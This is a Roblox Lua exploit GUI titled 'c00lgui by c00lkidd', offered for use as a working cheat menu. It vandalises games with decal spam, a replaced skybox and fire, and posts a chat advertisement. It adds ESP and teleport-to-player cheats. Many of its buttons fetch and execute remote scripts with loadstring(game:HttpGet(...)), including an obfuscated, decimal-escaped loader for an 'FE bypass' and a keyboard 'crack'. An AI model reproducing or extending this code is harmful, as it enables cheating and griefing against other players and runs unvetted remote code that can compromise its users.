local Players = game:GetService("Players")
local Lighting = game:GetService("Lighting")
local SoundService = game:GetService("SoundService")
local StarterGui = game:GetService("StarterGui")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")
local TeleportService = game:GetService("TeleportService")
local UserInputService = game:GetService("UserInputService")

-- Auto chat message when GUI loads
task.spawn(function()
    task.wait(1.5)
    local chatService = game:GetService("TextChatService")
    if chatService.ChatVersion == Enum.ChatVersion.TextChatService then
        chatService.TextChannels.RBXGeneral:SendAsync("c00lk1ddk1n9s / c00lkidd-Gu3sts gui has loaded")
    else
        ReplicatedStorage:WaitForChild("DefaultChatSystemChatEvents").SayMessageRequest:FireServer("c00lk1ddk1n9s / c00lkidd-Gu3sts gui has loaded", "All")
    end
end)

local function applySkybox()
    local sky = Instance.new("Sky", Lighting)
    local id = "rbxassetid://158118263"
    sky.SkyboxBk = id
    sky.SkyboxDn = id
    sky.SkyboxFt = id
    sky.SkyboxLf = id
    sky.SkyboxRt = id
    sky.SkyboxUp = id
end

local function decalSpam()
    for _, obj in ipairs(workspace:GetDescendants()) do
        if obj:IsA("Part") or obj:IsA("MeshPart") or obj:IsA("UnionOperation") or obj:IsA("Terrain") then
            for _, face in ipairs(Enum.NormalId:GetEnumItems()) do
                local decal = Instance.new("Decal")
                decal.Texture = "rbxassetid://158118263"
                decal.Face = face
                decal.Parent = obj
            end
        end
    end
end

local function activate666()
    for _, obj in ipairs(workspace:GetDescendants()) do
        if obj:IsA("Part") or obj:IsA("MeshPart") or obj:IsA("UnionOperation") then
            obj.Color = Color3.fromRGB(0, 0, 0)
            obj.Material = Enum.Material.SmoothPlastic
            obj.Reflectance = 0
            obj.Transparency = 0
            local fire = Instance.new("Fire")
            fire.Size = 10
            fire.Heat = 5
            fire.Color = Color3.fromRGB(255, 0, 0)
            fire.SecondaryColor = Color3.fromRGB(255, 0, 0)
            fire.Parent = obj
        end
    end
end

local function playSound()
    local music = Instance.new("Sound", SoundService)
    music.SoundId = "rbxassetid://95156028272944"
    music.Looped = true
    music.Volume = 1
    music.Pitch = 0.2
    music:Play()
end

local function showHint()
    local hint = Instance.new("Hint", workspace)
    hint.Text = "Team c00lkidd! Join today!"
end

local function particleEffect()
    for _, player in pairs(Players:GetPlayers()) do
        local function addParticles(character)
            local rootPart = character:WaitForChild("HumanoidRootPart", 5) or character:FindFirstChild("Torso")
            if rootPart then
                local attachment = Instance.new("Attachment", rootPart)
                local particle = Instance.new("ParticleEmitter", attachment)
                particle.Texture = "rbxassetid://158118263"
                particle.Rate = 25
                particle.Lifetime = NumberRange.new(2)
                particle.Speed = NumberRange.new(1, 2)
                particle.Size = NumberSequence.new(2)
                particle.LightEmission = 1
                particle.Transparency = NumberSequence.new(0)
                particle.SpreadAngle = Vector2.new(360, 360)
                particle.VelocitySpread = 180
            end
        end
        if player.Character then addParticles(player.Character) end
        player.CharacterAdded:Connect(addParticles)
    end
end

local function notifyScript(name, success)
    local imageId = "rbxassetid://158118263"
    local message = success and "Have fun!" or "Script didn't load"
    StarterGui:SetCore("SendNotification", { Title = name, Text = message, Icon = imageId, Duration = 5 })
end

local function loadScript(url, name, useAsync)
    local success = pcall(function()
        if useAsync then
            loadstring(game:HttpGetAsync(url))()
        else
            loadstring(game:HttpGet(url))()
        end
    end)
    notifyScript(name, success)
end

local function loadInfiniteYield()
    loadScript("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source", "Infinite Yield")
end

local function loadDex()
    loadScript("https://gist.githubusercontent.com/DinosaurXxX/b757fe011e7e600c0873f967fe427dc2/raw/ee5324771f017073fc30e640323ac2a9b3bfc550/dark%2520dex%2520v4", "Dark Dex")
end

local function loadRemoteSpy()
    loadScript("https://github.com/notpoiu/cobalt/releases/latest/download/Cobalt.luau", "Cobalt")
end

local function superRing()
    loadScript("https://rscripts.net/raw/super-ring-parts-v4-by-lukas_1741980981842_td0ummjymf.txt", "Super Ring")
end

-- === FIXED: John Doe (now loads the FE bypass you provided) ===
local function johnDoe()
    loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\103\48\48\108\88\112\108\111\105\116\101\114\47\103\48\48\108\88\112\108\111\105\116\101\114\47\109\97\105\110\47\70\101\37\50\48\98\121\112\97\115\115\34\44\32\116\114\117\101\41\41\40\41\10")()
end

local function rejoin()
    TeleportService:Teleport(game.PlaceId, Players.LocalPlayer)
end

local function serverHop()
    loadstring(game:HttpGet("https://pastebin.com/raw/cWbZhmD3"))()
end

local function tpClosest()
    local player = Players.LocalPlayer
    local char = player.Character
    if not char or not char:FindFirstChild("HumanoidRootPart") then return end
    local hrp = char.HumanoidRootPart
    local closest, dist = nil, math.huge
    for _, p in pairs(Players:GetPlayers()) do
        if p ~= player and p.Character and p.Character:FindFirstChild("HumanoidRootPart") then
            local d = (hrp.Position - p.Character.HumanoidRootPart.Position).Magnitude
            if d < dist then
                dist = d
                closest = p
            end
        end
    end
    if closest and closest.Character and closest.Character:FindFirstChild("HumanoidRootPart") then
        hrp.CFrame = closest.Character.HumanoidRootPart.CFrame
    end
end

local function esp()
    for _, player in pairs(Players:GetPlayers()) do
        if player ~= Players.LocalPlayer and player.Character then
            local highlight = Instance.new("Highlight")
            highlight.Parent = player.Character
            highlight.FillColor = Color3.fromRGB(255, 0, 0)
            highlight.OutlineColor = Color3.fromRGB(255, 255, 255)
            highlight.FillTransparency = 0.5
            highlight.OutlineTransparency = 0
        end
    end
end

local function invisibleGui()
    loadstring(game:HttpGet('https://pastebin.com/raw/3Rnd9rHf'))()
end

-- === FIXED: Fly (now a working toggle - click once to enable, click again to disable) ===
local flyActive = false
local currentBV = nil
local currentBG = nil
local flyConnection = nil

local function fly()
    local player = Players.LocalPlayer
    local character = player.Character
    if not character or not character:FindFirstChild("HumanoidRootPart") then
        notifyScript("Fly", false)
        return
    end

    if flyActive then
        -- DISABLE FLY
        flyActive = false
        if currentBV then currentBV:Destroy() currentBV = nil end
        if currentBG then currentBG:Destroy() currentBG = nil end
        if flyConnection then flyConnection:Disconnect() flyConnection = nil end
        local humanoid = character:FindFirstChild("Humanoid")
        if humanoid then humanoid.PlatformStand = false end
        StarterGui:SetCore("SendNotification", {Title = "Fly", Text = "Fly disabled", Duration = 3})
        return
    end

    -- ENABLE FLY
    flyActive = true
    local rootPart = character.HumanoidRootPart
    local humanoid = character:FindFirstChild("Humanoid")
    if humanoid then humanoid.PlatformStand = true end

    currentBV = Instance.new("BodyVelocity")
    currentBV.MaxForce = Vector3.new(9e9, 9e9, 9e9)
    currentBV.Velocity = Vector3.new(0, 0, 0)
    currentBV.Parent = rootPart

    currentBG = Instance.new("BodyGyro")
    currentBG.MaxTorque = Vector3.new(9e9, 9e9, 9e9)
    currentBG.P = 10000
    currentBG.Parent = rootPart

    local speed = 50
    local camera = workspace.CurrentCamera
    local keys = {}

    flyConnection = RunService.RenderStepped:Connect(function()
        if not flyActive then return end
        local move = Vector3.new(0, 0, 0)
        if keys[Enum.KeyCode.W] then move = move + camera.CFrame.LookVector end
        if keys[Enum.KeyCode.S] then move = move - camera.CFrame.LookVector end
        if keys[Enum.KeyCode.A] then move = move - camera.CFrame.RightVector end
        if keys[Enum.KeyCode.D] then move = move + camera.CFrame.RightVector end
        if keys[Enum.KeyCode.Space] then move = move + Vector3.new(0, 1, 0) end
        if keys[Enum.KeyCode.LeftShift] then move = move - Vector3.new(0, 1, 0) end

        currentBV.Velocity = move.Unit * speed
        currentBG.CFrame = camera.CFrame
    end)

    -- Input handling (created only once per enable to prevent stacking)
    local beganConn = UserInputService.InputBegan:Connect(function(input)
        if input.KeyCode then keys[input.KeyCode] = true end
    end)
    local endedConn = UserInputService.InputEnded:Connect(function(input)
        if input.KeyCode then keys[input.KeyCode] = false end
    end)

    -- Clean up input connections when fly is disabled
    task.delay(0.1, function()
        if not flyActive then
            if beganConn then beganConn:Disconnect() end
            if endedConn then endedConn:Disconnect() end
        end
    end)

    StarterGui:SetCore("SendNotification", {Title = "Fly", Text = "Fly ENABLED\nWASD + Space/Shift to move\nClick Fly button again to disable", Duration = 6})
end

local function allSeeingHand()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ian49972/SCRIPTS/refs/heads/main/hand", true))()
end

local function grabKnifeV3()
    loadstring(game:HttpGet("https://pastebin.com/raw/JykjsJYST", true))()
end

local function grabKnifeV4()
    loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Grab-knife-v4-24753"))()
end

local function deltaKeyboard()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Xxtan31/Ata/main/deltakeyboardcrack.txt", true))()
end

local function betterFly()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/XNEOFF/FlyGuiV3/main/FlyGuiV3.txt"))()
end

local function c00lguiRC7()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/MiRw3b/c00lgui-v3rx/main/c00lguiv3rx.lua"))()
end

-- === Btools (FE version) ===
local function btools()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/zxciaz/FEB/main/Btools"))()
end

-- === Go to Game (Place ID Teleporter) ===
local function goToGame()
    local player = Players.LocalPlayer
    local screenGui = Instance.new("ScreenGui")
    screenGui.Parent = player:WaitForChild("PlayerGui")
    screenGui.Name = "TeleportGui"
    screenGui.ResetOnSpawn = false

    local frame = Instance.new("Frame", screenGui)
    frame.Size = UDim2.new(0, 300, 0, 150)
    frame.Position = UDim2.new(0.5, -150, 0.5, -75)
    frame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    frame.BorderSizePixel = 0

    local title = Instance.new("TextLabel", frame)
    title.Size = UDim2.new(1, 0, 0, 30)
    title.BackgroundTransparency = 1
    title.Text = "Enter Place ID"
    title.TextColor3 = Color3.new(1,1,1)
    title.Font = Enum.Font.SourceSansBold
    title.TextSize = 24

    local textBox = Instance.new("TextBox", frame)
    textBox.Size = UDim2.new(0.9, 0, 0, 40)
    textBox.Position = UDim2.new(0.05, 0, 0.3, 0)
    textBox.PlaceholderText = "Paste Place ID here..."
    textBox.Text = ""
    textBox.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
    textBox.TextColor3 = Color3.new(1,1,1)
    textBox.Font = Enum.Font.SourceSans
    textBox.TextSize = 20

    local teleportButton = Instance.new("TextButton", frame)
    teleportButton.Size = UDim2.new(0.9, 0, 0, 40)
    teleportButton.Position = UDim2.new(0.05, 0, 0.65, 0)
    teleportButton.Text = "Teleport"
    teleportButton.BackgroundColor3 = Color3.fromRGB(0, 170, 0)
    teleportButton.TextColor3 = Color3.new(1,1,1)
    teleportButton.Font = Enum.Font.SourceSansBold
    teleportButton.TextSize = 22
    teleportButton.MouseButton1Click:Connect(function()
        local placeIdStr = textBox.Text:match("%d+")
        if placeIdStr then
            local placeId = tonumber(placeIdStr)
            if placeId and placeId > 0 then
                notifyScript("Teleporting...", true)
                TeleportService:Teleport(placeId, player)
            else
                StarterGui:SetCore("SendNotification", {Title = "Error", Text = "Invalid Place ID", Duration = 5})
            end
        end
        screenGui:Destroy()
    end)

    local closeBtn = Instance.new("TextButton", frame)
    closeBtn.Size = UDim2.new(0, 30, 0, 30)
    closeBtn.Position = UDim2.new(1, -35, 0, 5)
    closeBtn.Text = "X"
    closeBtn.BackgroundColor3 = Color3.fromRGB(200, 0, 0)
    closeBtn.TextColor3 = Color3.new(1,1,1)
    closeBtn.MouseButton1Click:Connect(function()
        screenGui:Destroy()
    end)
end

local actions = {
    applySkybox, decalSpam, activate666, playSound, showHint, particleEffect,
    loadInfiniteYield, loadDex, loadRemoteSpy, superRing, johnDoe,
    rejoin, serverHop, tpClosest, esp, invisibleGui, fly,
    allSeeingHand, grabKnifeV3, grabKnifeV4, deltaKeyboard,
    betterFly, c00lguiRC7, btools, goToGame
}

local labels = {
    "Skybox", "Decal Spam", "666", "Play Sound", "Hint", "Particles",
    "Infinite Yield", "Dark Dex", "RemoteSpy", "Super Ring", "John Doe",
    "Rejoin", "Server Hop", "TP Closest", "ESP", "Invisible GUI", "Fly",
    "All Seeing Hand", "Grab Knife V3", "Grab Knife V4", "Delta Keyboard",
    "Better Fly", "c00lgui RC7", "Btools", "Go to Game"
}

-- === GUI Setup (unchanged) ===
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "GridUI"
ScreenGui.Parent = game:GetService("CoreGui")

local buttonWidth = 120
local buttonHeight = 70
local spacingX = 30
local spacingY = 20
local rows = 3
local cols = 3
local titleHeight = 40
local topPadding = 10
local bottomPadding = 10
local pageBarHeight = 50

local totalWidth = buttonWidth * cols + spacingX * (cols - 1)
local totalHeight = titleHeight + topPadding + bottomPadding + rows * buttonHeight + (rows - 1) * spacingY + pageBarHeight

local Frame = Instance.new("Frame")
Frame.Name = "MainFrame"
Frame.Size = UDim2.new(0, totalWidth + 40, 0, totalHeight)
Frame.Position = UDim2.new(0.5, -(totalWidth + 40)/2, 0.5, -totalHeight/2)
Frame.BackgroundColor3 = Color3.fromRGB(100, 0, 0)
Frame.BorderSizePixel = 0
Frame.Active = true
Frame.Draggable = true
Frame.Parent = ScreenGui

local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(0, totalWidth + 40, 0, titleHeight)
Title.BackgroundTransparency = 1
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.Font = Enum.Font.SourceSansBold
Title.TextSize = 24
Title.Text = "c00lgui by c00lkidd"
Title.Parent = Frame

local backgroundImage = Instance.new("ImageLabel")
backgroundImage.Image = "rbxassetid://158118263"
backgroundImage.Size = UDim2.new(0, 300, 0, 300)
backgroundImage.Position = UDim2.new(0, -120, 0.5, -150)
backgroundImage.BackgroundTransparency = 1
backgroundImage.Rotation = -25
backgroundImage.ZIndex = 0
backgroundImage.Parent = Frame

local buttonsPerPage = rows * cols
local totalPages = math.ceil(#actions / buttonsPerPage)
local currentPage = 1

local function updateButtons()
    for _, child in ipairs(Frame:GetChildren()) do
        if child:IsA("TextButton") and string.find(child.Name or "", "ActionButton") then
            child:Destroy()
        end
    end

    local pageStart = (currentPage - 1) * buttonsPerPage + 1
    local pageEnd = math.min(pageStart + buttonsPerPage - 1, #actions)
    local numButtons = pageEnd - pageStart + 1

    local startX = 20
    local startY = titleHeight + topPadding

    for i = 0, numButtons - 1 do
        local actionIndex = pageStart + i
        local row = math.floor(i / cols)
        local col = i % cols

        local Button = Instance.new("TextButton")
        Button.Name = "ActionButton" .. actionIndex
        Button.Size = UDim2.new(0, buttonWidth, 0, buttonHeight)
        Button.Position = UDim2.new(0, startX + col*(buttonWidth+spacingX), 0, startY + row*(buttonHeight+spacingY))
        Button.BackgroundColor3 = Color3.fromRGB(120, 0, 0)
        Button.BorderSizePixel = 0
        Button.TextColor3 = Color3.fromRGB(255, 255, 255)
        Button.Font = Enum.Font.SourceSansBold
        Button.TextSize = 18
        Button.Text = labels[actionIndex]
        Button.ZIndex = 1
        Button.Parent = Frame
        Button.MouseButton1Click:Connect(actions[actionIndex])
    end

    local pageLabel = Frame:FindFirstChild("PageLabel")
    if pageLabel then pageLabel.Text = "Page " .. currentPage .. "/" .. totalPages end

    local left = Frame:FindFirstChild("LeftPage")
    if left then left.Visible = currentPage > 1 end

    local right = Frame:FindFirstChild("RightPage")
    if right then right.Visible = currentPage < totalPages end
end

-- Page buttons and label
local leftBtn = Instance.new("TextButton")
leftBtn.Name = "LeftPage"
leftBtn.Size = UDim2.new(0, 50, 0, 30)
leftBtn.Position = UDim2.new(0, 20, 0, totalHeight - pageBarHeight + 10)
leftBtn.BackgroundColor3 = Color3.fromRGB(120, 0, 0)
leftBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
leftBtn.Font = Enum.Font.SourceSansBold
leftBtn.TextSize = 24
leftBtn.Text = "<"
leftBtn.Parent = Frame
leftBtn.MouseButton1Click:Connect(function()
    if currentPage > 1 then
        currentPage -= 1
        updateButtons()
    end
end)

local rightBtn = Instance.new("TextButton")
rightBtn.Name = "RightPage"
rightBtn.Size = UDim2.new(0, 50, 0, 30)
rightBtn.Position = UDim2.new(0, totalWidth - 70, 0, totalHeight - pageBarHeight + 10)
rightBtn.BackgroundColor3 = Color3.fromRGB(120, 0, 0)
rightBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
rightBtn.Font = Enum.Font.SourceSansBold
rightBtn.TextSize = 24
rightBtn.Text = ">"
rightBtn.Parent = Frame
rightBtn.MouseButton1Click:Connect(function()
    if currentPage < totalPages then
        currentPage += 1
        updateButtons()
    end
end)

local pageLabel = Instance.new("TextLabel")
pageLabel.Name = "PageLabel"
pageLabel.Size = UDim2.new(0, 100, 0, 30)
pageLabel.Position = UDim2.new(0, (totalWidth - 100)/2, 0, totalHeight - pageBarHeight + 10)
pageLabel.BackgroundTransparency = 1
pageLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
pageLabel.Font = Enum.Font.SourceSansBold
pageLabel.TextSize = 18
pageLabel.Text = "Page 1/" .. totalPages
pageLabel.Parent = Frame

updateButtons()
